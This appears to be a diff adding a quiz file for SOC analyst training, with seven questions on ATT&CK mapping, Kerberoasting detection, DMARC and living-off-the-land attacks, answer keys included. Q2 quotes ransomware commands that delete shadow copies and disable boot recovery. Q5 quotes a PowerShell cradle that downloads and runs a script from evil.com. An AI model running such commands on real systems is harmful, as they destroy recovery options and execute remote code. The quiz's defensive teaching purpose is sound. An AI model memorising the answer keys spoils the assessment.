@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<quiz>
+  <name>
+    <text>Session 06 Final Quiz — Incident Analysis in a Threat-Centric SOC</text>
+  </name>
+  <intro>
+    <text>Complete this quiz after finishing all session content. 7 questions, 15 minutes. Passing score: 5/7.</text>
+  </intro>
+  <introformat>1</introformat>
+  <shuffleanswers>1</shuffleanswers>
+  <preferredbehaviour>deferredfeedback</preferredbehaviour>
+
+  <!-- Question 1 -->
+  <question type="multichoice">
+    <name><text>Q1: Masquerading — svchost.exe from PowerShell</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>A SOC analyst discovers that <code>svchost.exe</code> running on a server is making outbound TCP connections to port 4444 on an external IP. The process has a parent process of <code>powershell.exe</code>. Which MITRE ATT&amp;CK technique BEST describes the <code>svchost.exe</code> behavior?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>T1055 — Process Injection</text>
+      <feedback><text>Process injection involves inserting code into a running process. Here, svchost.exe is a separate process spawned by PowerShell, not injected code.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>T1036.005 — Masquerading: Match Legitimate Name</text>
+      <feedback><text>Correct. Legitimate svchost.exe is always spawned by services.exe or wininit.exe — never by PowerShell. A svchost.exe process with a PowerShell parent is a malicious process using a legitimate Windows name to blend in (masquerading). This is T1036.005.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1543.003 — Create or Modify System Process: Windows Service</text>
+      <feedback><text>This technique describes creating or modifying services for persistence. The key indicator here is the suspicious parent process, pointing to masquerading rather than service creation.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1071.001 — Application Layer Protocol: Web Protocols</text>
+      <feedback><text>T1071.001 describes using web protocols (HTTP/S) for C2. The network connection to port 4444 is suspicious, but the primary behavioral indicator here is the masquerading name and anomalous parent process.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 2 -->
+  <question type="multichoice">
+    <name><text>Q2: vssadmin + bcdedit attack type</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>During an incident, you discover: <code>vssadmin.exe delete shadows /all /quiet</code> followed by <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures</code>. What type of incident is MOST likely in progress?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>Data exfiltration via encrypted channel</text>
+      <feedback><text>These commands do not transfer data externally. They modify system recovery settings — specifically, they remove recovery options to prevent undoing an upcoming destructive operation.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Ransomware pre-deployment (anti-recovery stage)</text>
+      <feedback><text>Correct. Both commands are standard ransomware preparation. vssadmin removes Volume Shadow Copies (preventing file restoration). bcdedit disables Windows error recovery (preventing boot-time repair). These are T1490 (Inhibit System Recovery) — the attacker is preparing the system so victims cannot recover files without paying.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Lateral movement using Pass-the-Hash</text>
+      <feedback><text>Pass-the-Hash involves reusing NTLM hashes for authentication to remote systems. These commands target local recovery mechanisms, not network authentication.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Web application SQL injection</text>
+      <feedback><text>SQL injection affects web application databases. These are Windows system commands executed locally, completely unrelated to SQL injection.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 3 -->
+  <question type="multichoice">
+    <name><text>Q3: Pyramid of Pain — least valuable indicator</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>Using the <strong>Pyramid of Pain</strong> framework (David Bianco), which indicator type is the LEAST valuable for detection because it is easiest for attackers to change?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>Adversary TTPs (Tactics, Techniques, Procedures)</text>
+      <feedback><text>TTPs are at the TOP of the pyramid — the most valuable and hardest for attackers to change. Changing TTPs requires retraining, buying new tools, and fundamentally changing how the actor operates.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Network/host artifacts</text>
+      <feedback><text>Artifacts (file paths, registry keys, mutexes) are in the middle of the pyramid — harder to change than hashes or IPs, but less valuable than TTPs.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Hash values of malware files</text>
+      <feedback><text>Correct. File hashes are at the BOTTOM of the Pyramid of Pain — the easiest for attackers to change. Recompiling the same malware with one byte different produces a completely new hash. IOC-based detection using hashes is trivially bypassed. TTP-based detection survives tool changes.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Domain names used for C2</text>
+      <feedback><text>Domain names are higher in the pyramid than hashes — changing them requires registering new domains, updating malware configurations, and waiting for DNS propagation. More costly to change than hashes, but still not as valuable as TTP-based detection.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 4 -->
+  <question type="multichoice">
+    <name><text>Q4: Kerberoasting detection — Event ID</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>A threat intelligence report indicates an attacker group uses <strong>Kerberoasting (T1558.003)</strong>. Which Windows Security Event would BEST detect this technique?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>Event ID 4624 (Logon) with Logon_Type 3</text>
+      <feedback><text>Event 4624 logs successful logons. Logon_Type 3 is network logon (SMB). This is relevant to lateral movement, not Kerberoasting.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Event ID 4769 (Kerberos Service Ticket Request) with RC4 encryption type (0x17)</text>
+      <feedback><text>Correct. Kerberoasting requests TGS tickets using RC4 (0x17) encryption because RC4-encrypted tickets are crackable offline. Modern Kerberos defaults to AES (0x12/0x11). When you see Event 4769 with ticket_encryption_type=0x17 for a service account, this is a strong Kerberoasting signal (T1558.003).</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Event ID 4688 (Process Creation) for net.exe</text>
+      <feedback><text>Event 4688 for net.exe detects domain enumeration commands (net user /domain). Kerberoasting uses Kerberos protocol directly — no net.exe command is involved.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>Event ID 4672 (Special Privileges Assigned)</text>
+      <feedback><text>Event 4672 fires when a special privilege is assigned at logon (e.g., SeDebugPrivilege). This is relevant to privilege escalation monitoring but does not specifically detect Kerberoasting.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 5 -->
+  <question type="multichoice">
+    <name><text>Q5: PowerShell download cradle ATT&CK techniques</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>You decode a Base64 PowerShell command: <code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')</code></p><p>Which two ATT&amp;CK techniques BEST describe this activity?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="100">
+      <text>T1059.001 (PowerShell) + T1105 (Ingress Tool Transfer)</text>
+      <feedback><text>Correct. IEX executing a remotely hosted PowerShell script is: T1059.001 (PowerShell as execution engine) + T1105 (downloading a tool/payload from external infrastructure = Ingress Tool Transfer). The Base64 encoding also adds T1027 (Obfuscation), but the primary pair describing the cradle behavior is PS + Ingress Tool Transfer.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1059.001 (PowerShell) + T1566.001 (Spearphishing Attachment)</text>
+      <feedback><text>T1566.001 describes the phishing delivery mechanism (email with attachment). The download cradle itself is execution + tool download, not the initial phishing delivery.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1105 (Ingress Tool Transfer) + T1071.001 (Web Protocols)</text>
+      <feedback><text>T1071.001 describes C2 over web protocols. T1105 is correct, but the execution engine used is PowerShell (T1059.001), which is the more specific and actionable technique here.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>T1027 (Obfuscation) + T1204.002 (User Execution)</text>
+      <feedback><text>T1027 describes the Base64 encoding (obfuscation) and T1204.002 describes user execution of malicious files. These are related but don't specifically describe the download cradle behavior.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 6 -->
+  <question type="multichoice">
+    <name><text>Q6: DMARC p=none security impact</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>An organization's DMARC policy is set to <code>p=none</code>. A threat actor sends a phishing email spoofing the CEO's domain. What is the security impact of the <code>p=none</code> policy?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>The email will be rejected at the mail gateway</text>
+      <feedback><text>Rejection requires p=reject. With p=none, no enforcement action is taken — the domain owner receives reports but emails pass through regardless of authentication failure.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>The email will be quarantined to spam/junk folder</text>
+      <feedback><text>Quarantine requires p=quarantine. With p=none, emails are not quarantined even when authentication fails.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>The email will be delivered with a DMARC PASS result</text>
+      <feedback><text>A spoofed email would fail SPF and/or DKIM, resulting in a DMARC FAIL — but with p=none, this failure has no enforcement consequence and the email is still delivered.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>The email will be delivered despite authentication failure — p=none only monitors, it does not enforce</text>
+      <feedback><text>Correct. DMARC p=none = monitoring mode. Authentication results are reported to the domain owner but no enforcement action is taken. Phishing emails that fail SPF/DKIM/DMARC checks are still delivered. Moving to p=quarantine or p=reject is necessary to prevent spoofed email delivery. Many organizations remain in p=none for extended periods, creating a persistent phishing vulnerability.</text></feedback>
+    </answer>
+  </question>
+
+  <!-- Question 7 -->
+  <question type="multichoice">
+    <name><text>Q7: 21-day dwell time with LOLBins — lesson learned</text></name>
+    <questiontext format="html">
+      <text><![CDATA[<p>A post-incident review reveals the attacker had domain admin credentials for <strong>21 days</strong> before ransomware deployment, using only living-off-the-land techniques (LOLBins) and valid credentials. No custom malware was used. What is the PRIMARY lesson learned?</p>]]></text>
+    </questiontext>
+    <defaultgrade>1</defaultgrade>
+    <shuffleanswers>1</shuffleanswers>
+    <single>true</single>
+    <answer fraction="0">
+      <text>The firewall should have blocked the initial phishing email</text>
+      <feedback><text>Improving email filtering addresses the delivery phase, but does not solve the detection gap for the 21-day post-compromise period. The lesson is about detection during the post-compromise phase, not just initial access prevention.</text></feedback>
+    </answer>
+    <answer fraction="100">
+      <text>Detection based only on IOCs (file hashes, IPs) is insufficient — behavioral/TTP-based detection is required</text>
+      <feedback><text>Correct. LOLBins produce no malicious file hashes (they are Microsoft-signed binaries). Valid credentials produce no unauthorized account alerts. IOC-based detection is completely blind to this attack pattern. Only behavioral detection can identify living-off-the-land: DCSync from workstations, massive RC4 Kerberos ticket requests, unusual AD enumeration, scheduled task creation on DCs. This is the fundamental argument for threat-centric, TTP-based detection over compliance-driven, IOC-based detection.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>The organization should have enforced MFA on email</text>
+      <feedback><text>MFA on email addresses initial credential compromise but does not address the detection gap for the 21-day dwell period using LOLBins and valid credentials on internal systems.</text></feedback>
+    </answer>
+    <answer fraction="0">
+      <text>The incident response plan should have faster recovery procedures</text>
+      <feedback><text>Faster recovery addresses the post-detection phase. The 21-day dwell time means the attacker was not detected at all — improving recovery speed doesn't address the fundamental detection gap.</text></feedback>
+    </answer>
+  </question>
+
+</quiz>
